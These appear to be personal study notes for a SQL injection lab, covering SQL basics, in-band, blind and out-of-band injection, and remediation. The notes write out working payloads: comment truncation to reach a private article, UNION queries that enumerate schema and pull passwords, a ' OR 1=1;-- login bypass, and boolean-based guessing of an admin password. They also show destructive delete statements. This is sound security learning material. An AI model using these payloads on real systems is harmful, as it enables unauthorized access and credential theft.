Remediation

When a web application communicates with a database using the input from the user that hasn’t been properly validated/sanitized it could lead to retrieval/altering of unauthorized data.

Databases are managed by DBMS (Database Management Systems) and they can be classified into relational and non-relational. In this module we will be focusing on relational database, the common DBMS we will come across are MySQL, PostgreSQL, Microsoft SQL Server, Access and SQLite.

Column referred to as field.

Key field helps in finding that exact row in a table.

The table contains a unique ID called the primary key, and a foreign key that establish a relation between the tables (not necessary, even primary key can be used).

SQL

SQL syntax is not case-sensitive, and the below commands are based on MySQL.

  • SELECT- used to retrieve data from the database.
    select * from users;
select username,password from users;
select * from users LIMIT 1;
select * from users LIMIT 1,1;(skips 1 row and return 1 row after the skip)
select * from users LIMIT 2,1; (skips 2 rows and returns 1 row after the skip)
In LIMIT the first number indicates the no of rows to skip and 
the second number indicates the no of rows to return.
select * from users WHERE username='admin';
select * from users WHERE username != 'admin';
select * from users WHERE username='admin' OR username='jon';
select * from users WHERE username='admin' AND password='p4ssword';
select * from users WHERE username LIKE 'a%'; (will return the row with username that start with a)
select * from users WHERE username LIKE '%n'; (will return the row with username that ends with n)
select * from users WHERE username LIKE '%mi%'; ( will return rows with username that contains 'mi')
select name,address,city,postcode from customers UNION select company, address, city, postcode from suppliers;
(When using UNION we have to check if the columns that are combined from different 
tables are of the same datatype.)
  • INSERT - used to insert data into database.
    insert into users (username,password) values ('bob', 'password123');
  • UPDATE - used to update one or more than one row in a database.
    update users SET username='root',password='pass123' where username='admin';
  • DELETE - used to delete one or more rows in a database, similar to the select we could use the WHERE clause and LIMIT clause specifically.
    delete from users where username='martin';
delete from user; (Since no WHERE clause is used all the data from users table will be deleted)

SQL Injection

Injection happens when a web application uses user input in its SQL query.

https://website.thm/blog?id=1
SELECT * from blog where id=1 and private=0 LIMIT 1;

This will retrieve from the blog table an article with id equal to 1 and private=0 means its public and the retrieval is limited to 1 article.

Now lets consider and article with id=2 which is not public,

https://website.thm/blog?id=2;--
SELECT * from blog where id=2;-- and private=0 LIMIT 1;
SELECT * from blog where id=2;

What happens, the semicolon tells that the query ends at id=2 and the — comments the rest of the query, hence retrieving a file kept as private.

There are three type of SQL Injection,

  1. In-Band SQL Injection
  1. Blind SQL Injection
  1. Out-of-Band SQL Injection

In-Band SQLi

In-Band refers to the same method of communication being used to exploit the vulnerability and receive the results. For example, discovering a SQL vulnerability on a page and able to extract data and display it on the same page.

Error based SQLi- very useful in obtaining information regarding the database structure or even the whole database.

Union based SQLi - using a union alongside a search operator to extract data, it's the most commonly used exploit to retrieve large amounts of data.

1 UNION SELECT 1

1 UNION SELECT 1,2,3
0 UNION SELECT 1,2,3
0 UNION SELECT 1,2,database()
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
0 UNION SELECT 1,2,password FROM staff_users WHERE username = 'martin';
group_concat(username,':',password SEPARATOR '<br>') FROM staff_users

Blind SQLi

Authentication Bypass

We get little to no feedback to confirm whether our exploit worked.

Authentication bypass is one of the most common techniques for blind SQLi, in login form the web application is not interested in retrieving the username or password, it is interested to check if the combination works or not, so it just asks the same to database.

select * from users where username='%username%' and password='%password%' LIMIT 1;

so in this the payload is passed to the password column,

' OR 1=1;--
 select * from users where username=%username%' and password='' OR 1=1;-- ' LIMIT 1;

Now this will show true since 1=1.

Boolean Based

It refers to the response we receive for our injection attempts, which could be on/off, true/false, yes/no, etc.

This gave as error, stating the columns are not matching, so until we get the no of columns

To find info on database, before in the authentication bypass we used WHERE because the output was printed but here, we use like because we get either true or false, so the question should be like or not.

We first start with the first letter like a% and it returns false, we check with all letters and got true for s.

Similarly doing for ‘sa%’,’sb%’ and so on until we get the full name of the database, which is sqli_three. Now to enumerate the tables the same way,

admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--

Finally got table name users, by the way we could automate this process using burpsuite.

Similarly to find columns in the table users,

admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';

we get column name id, to enumerate other columns names we have to mention that it should not be id,

admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';

By this method we can find that the column names are id, username and password.

Similarly to enumerate the password of admin,

admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%';--

so the found password is 3845.

Out of Band

It is not as common as it requires some specific feature enabled in the database server or the web application business logic. It is classified by two different communication channel, one to lauch the attack and other to get the results.

It needs like and HTTP/DNS connection from the database for the result.

Remediation

  • Escaping User Input - characters like ‘ “ $ \ can cause SQL queries to break and that could lead to injection attacks. Escaping user input is a method of prepending a backslash \ to these characters, which then parses the payload as string.
  • Input Validation - Employing an allow list that only takes in a set of keywords as input. Or a string replacement method where characters can be filtered out using allow or disallow.
  • Prepared Statements with parameterized queries - first the developer writes the query then the input is added as a parameter.
